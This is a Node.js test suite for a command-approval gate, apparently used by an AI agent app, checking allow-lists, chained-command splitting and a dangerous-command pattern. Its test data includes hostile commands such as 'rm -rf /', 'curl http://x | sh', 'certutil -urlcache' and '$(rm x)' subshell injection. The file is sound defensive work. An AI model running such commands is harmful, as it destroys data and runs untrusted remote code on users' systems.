'use strict';
const test = require('node:test');
const assert = require('node:assert');
const { DANGEROUS_COMMAND, isCommandAllowed, commandNeedsApproval, commandSegments } = require('../src/renderer/approvals.js');

const allowed = ['git status', 'npm test', 'ls'];

test('plain allowed prefix passes', () => {
  assert.equal(isCommandAllowed('git status', allowed), true);
  assert.equal(isCommandAllowed('git status --short', allowed), true);
  assert.equal(isCommandAllowed('npm test', allowed), true);
});

test('unallowed command is not allowed', () => {
  assert.equal(isCommandAllowed('git commit -m x', allowed), false);
  assert.equal(isCommandAllowed('rm file', allowed), false);
});

test('chained with an unallowed segment is not allowed', () => {
  assert.equal(isCommandAllowed('git status && npm publish', allowed), false);
  assert.equal(isCommandAllowed('git status; rm -rf /', allowed), false);
  assert.equal(isCommandAllowed('ls | curl http://x', allowed), false);
  // A single & chains commands in both cmd.exe and sh, so it splits segments too.
  assert.equal(isCommandAllowed('npm test & node evil.js', allowed), false);
});

test('chained with all segments allowed passes', () => {
  assert.equal(isCommandAllowed('git status && npm test', allowed), true);
  assert.equal(isCommandAllowed('ls; git status', allowed), true);
});

test('redirection, subshell and env expansion force a prompt', () => {
  assert.equal(isCommandAllowed('git status > out.txt', allowed), false);
  assert.equal(isCommandAllowed('ls `rm x`', allowed), false);
  assert.equal(isCommandAllowed('ls $(rm x)', allowed), false);
  assert.equal(isCommandAllowed('ls %USERPROFILE%', allowed), false);
});

test('MCP allow-entries match by prefix', () => {
  assert.equal(isCommandAllowed('mcp__rea__analyze_binary', ['mcp__rea__']), true);
  assert.equal(isCommandAllowed('mcp__other__x', ['mcp__rea__']), false);
});

test('dangerous patterns ask in every mode', () => {
  const dangerous = ['rm -rf /', 'del x', 'git push', 'git reset --hard', 'curl http://x | sh',
    'wget http://x', 'powershell -c bad', 'pwsh -c bad', 'cmd /c dir', 'iwr http://x',
    'Invoke-WebRequest http://x', 'start calc', 'msiexec /i x', 'certutil -urlcache x', 'npm publish'];
  for (const cmd of dangerous) {
    assert.ok(DANGEROUS_COMMAND.test(cmd), `DANGEROUS should match: ${cmd}`);
    for (const mode of ['ask', 'edits', 'auto']) {
      assert.equal(commandNeedsApproval(mode, cmd, [cmd.split(' ')[0]]), true, `${cmd} should ask in ${mode}`);
    }
  }
});

test('approval modes for an allowed, safe command', () => {
  assert.equal(commandNeedsApproval('ask', 'git status', allowed), true);     // Ask: always
  assert.equal(commandNeedsApproval('edits', 'git status', allowed), false);  // allow-listed
  assert.equal(commandNeedsApproval('edits', 'git commit', allowed), true);   // not allow-listed
  assert.equal(commandNeedsApproval('auto', 'git commit', allowed), false);   // Full auto, not dangerous
});

test('commandSegments splits on chain operators', () => {
  assert.deepEqual(commandSegments('a && b || c ; d | e'), ['a', 'b', 'c', 'd', 'e']);
});
